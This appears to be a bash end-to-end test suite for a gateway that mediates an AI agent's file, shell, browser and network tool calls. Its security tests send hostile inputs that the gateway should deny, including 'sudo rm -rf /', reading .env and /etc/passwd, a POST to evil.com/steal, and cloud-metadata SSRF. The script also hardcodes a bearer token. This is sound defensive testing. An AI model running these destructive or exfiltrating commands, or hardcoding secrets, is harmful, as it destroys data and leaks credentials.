#!/usr/bin/env bash
# =============================================================================
# Gateway E2E Test — tests all 4 executor categories + security + hardening
#
# Usage:   bash gateway/tests/e2e_test.sh
# Prereqs: Gateway running on :8200, Experiment Bot with gateway_permissions
# =============================================================================

set -uo pipefail

TOKEN="5e2a794ad2465338be9229272adcb66a851d0edf6d241fdeca1d849ea2e3fca4"
AGENT_ID="cmm6hik2c0006pb9g1ryxavfu"
GW="http://localhost:8200"
PASS=0
FAIL=0
EXEC_ID="e2e-$(date +%s)"

gw_call() {
  local req_id="$1" tool="$2" category="$3" action="$4" args="$5"
  curl -s "$GW/api/v1/execute" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
      \"request_id\": \"$req_id\",
      \"agent_id\": \"$AGENT_ID\",
      \"execution_id\": \"$EXEC_ID\",
      \"user_id\": \"test-user\",
      \"tool\": \"$tool\",
      \"category\": \"$category\",
      \"action\": \"$action\",
      \"args\": $args
    }"
}

check() {
  local name="$1" expected="$2" actual="$3"
  if echo "$actual" | grep -qF "$expected" 2>/dev/null || echo "$actual" | grep -q "$expected" 2>/dev/null; then
    echo "  ✓ $name"
    PASS=$((PASS + 1))
  else
    echo "  ✗ $name (expected '$expected', got: $(echo "$actual" | head -c 200))"
    FAIL=$((FAIL + 1))
  fi
}

echo "============================================"
echo "  Gateway E2E Test Suite"
echo "  $(date)"
echo "============================================"
echo ""

# -- Health --
echo "▸ Health Check"
HEALTH_FULL=$(curl -s -D - "$GW/health" 2>/dev/null)
check "status ok" '"status":"ok"' "$HEALTH_FULL"
check "X-Request-ID header" "x-request-id" "$(echo "$HEALTH_FULL" | tr '[:upper:]' '[:lower:]')"
echo ""

# -- 1. Filesystem --
echo "▸ Filesystem"
R=$(gw_call fs1 gateway__fs_write filesystem write '{"path":"/workspace/output/e2e.txt","content":"Hello from E2E test!"}')
check "write file" '"status":"allowed"' "$R"

R=$(gw_call fs2 gateway__fs_read filesystem read '{"path":"/workspace/output/e2e.txt"}')
check "read file" "Hello from E2E test" "$R"

R=$(gw_call fs3 gateway__fs_list filesystem list '{"path":"/workspace/output"}')
check "list dir" '"status":"allowed"' "$R"
echo ""

# -- 2. Shell --
echo "▸ Shell"
R=$(gw_call sh1 gateway__shell_exec shell exec '{"command":"echo Gateway-Shell-OK"}')
check "echo command" "Gateway-Shell-OK" "$R"

R=$(gw_call sh2 gateway__shell_exec shell exec '{"command":"cat /workspace/output/e2e.txt"}')
check "cat file" "Hello from E2E test" "$R"
echo ""

# -- 3. Browser --
echo "▸ Browser"
R=$(gw_call br1 gateway__browser_browse browser browse '{"url":"https://httpbin.org/html"}')
check "browse HTML" "Moby-Dick" "$R"
echo ""

# -- 4. Network --
echo "▸ Network"
R=$(gw_call net1 gateway__net_request network request '{"url":"https://httpbin.org/get","method":"GET"}')
check "GET request" "HTTP 200" "$R"

R=$(gw_call net2 gateway__net_request network request '{"url":"https://httpbin.org/post","method":"POST","body":"{\"test\":true}","headers":{"Content-Type":"application/json"}}')
check "POST request" "HTTP 200" "$R"
check "POST body echoed" 'test' "$R"
echo ""

# -- Security: Permission Denials --
echo "▸ Security — Permission Denials"

R=$(gw_call sec1 gateway__fs_read filesystem read '{"path":"/workspace/.env"}')
check "deny .env read" '"status":"denied"' "$R"

R=$(gw_call sec2 gateway__fs_read filesystem read '{"path":"../../etc/passwd"}')
check "deny path traversal" '"status":"denied"' "$R"

R=$(gw_call sec3 gateway__shell_exec shell exec '{"command":"sudo rm -rf /"}')
check "deny sudo" '"status":"denied"' "$R"

R=$(gw_call sec4 gateway__shell_exec shell exec '{"command":"rm -rf /workspace"}')
check "deny rm -rf" '"status":"denied"' "$R"

R=$(gw_call sec5 gateway__browser_browse browser browse '{"url":"http://localhost:8200/health"}')
check "deny browser localhost" '"status":"denied"' "$R"

R=$(gw_call sec6 gateway__net_request network request '{"url":"https://evil.com/steal","method":"POST"}')
check "deny unknown domain" '"status":"denied"' "$R"

R=$(gw_call sec7 gateway__net_request network request '{"url":"https://db.internal/dump","method":"GET"}')
check "deny *.internal" '"status":"denied"' "$R"
echo ""

# -- Security: SSRF Protection (executor-level) --
echo "▸ Security — SSRF Protection"
R=$(gw_call ssrf1 gateway__browser_browse browser browse '{"url":"https://192.168.1.1/admin"}')
check "block private IP (browser)" "private IP" "$R"

R=$(gw_call ssrf2 gateway__net_request network request '{"url":"http://169.254.169.254/metadata","method":"GET"}')
# This will be denied by domain pattern (not in allow list) or by SSRF check
check "block cloud metadata" '"status":"denied"' "$R"
echo ""

# -- Security: Auth --
echo "▸ Security — Authentication"
R=$(curl -s "$GW/api/v1/execute" \
  -H "Authorization: Bearer bad-token" \
  -H "Content-Type: application/json" \
  -d '{"request_id":"auth1","agent_id":"x","execution_id":"x","user_id":"x","tool":"x","category":"x","action":"x","args":{}}')
check "reject bad token" "403\|Invalid" "$R"
echo ""

# -- Hardening: Rate Limit Headers --
echo "▸ Hardening — Rate Limiting"
HEADERS=$(curl -s -D - "$GW/api/v1/execute" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"request_id":"rl1","agent_id":"'$AGENT_ID'","execution_id":"rl","user_id":"t","tool":"gateway__net_request","category":"network","action":"request","args":{"url":"https://httpbin.org/get"}}' \
  2>&1 | head -15)
check "X-RateLimit-Limit" "x-ratelimit-limit" "$(echo "$HEADERS" | tr '[:upper:]' '[:lower:]')"
check "X-RateLimit-Remaining" "x-ratelimit-remaining" "$(echo "$HEADERS" | tr '[:upper:]' '[:lower:]')"
echo ""

# -- Hardening: Body Size Limit --
echo "▸ Hardening — Body Size Limit"
STATUS=$(python3 -c "print('x' * 2_000_000)" | curl -s -o /dev/null -w "%{http_code}" "$GW/api/v1/execute" \
  -H "Content-Type: application/json" \
  -H "Content-Length: 2000000" \
  -d @-)
check "reject 2MB body (413)" "413" "$STATUS"
echo ""

# -- Release sandbox --
curl -s -X POST "$GW/api/v1/release/$EXEC_ID" \
  -H "Authorization: Bearer $TOKEN" > /dev/null

# -- Summary --
TOTAL=$((PASS + FAIL))
echo "============================================"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL $TOTAL TESTS PASSED ✓"
else
  echo "  $PASS/$TOTAL passed, $FAIL FAILED ✗"
fi
echo "============================================"

exit "$FAIL"
